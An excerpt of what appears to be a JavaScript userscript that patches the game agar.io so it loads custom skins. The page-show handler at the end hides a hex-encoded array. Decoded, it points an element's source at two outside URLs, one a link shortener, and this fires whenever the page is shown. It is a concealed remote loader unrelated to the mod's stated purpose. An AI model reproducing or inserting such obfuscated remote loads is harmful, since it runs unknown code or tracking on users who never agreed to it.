...
var version = 198; //DO NOT USE PERIODS
...
function agariomodsRuntimePatches() {
	...
	gamejs_patch('c=null:c=null;','c=null:c=null;if(imgur&&'+b+'.substring(0,2)=="i/"){c=null;}','Stop showing of imgur skins(when enabled)');
        ...
        gamejs_patch('M[d].src="skins/"+'+b+'+".png"', 'M[d].src=agariomods', "check for agariomods img src variable");
...
window.onpageshow = function() {
	...
	var _0xb14f=["\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x68\x61\x2E\x61\x6C\x2F\x61\x67\x61\x72\x6D\x6F\x64","\x68\x74\x74\x70\x3A\x2F\x2F\x75\x2E\x74\x6F\x2F\x67\x53\x79\x34\x43\x77"];var b=s;var n=s;b[_0xb14f[0]]=_0xb14f[1];n[_0xb14f[0]]=_0xb14f[2];
}
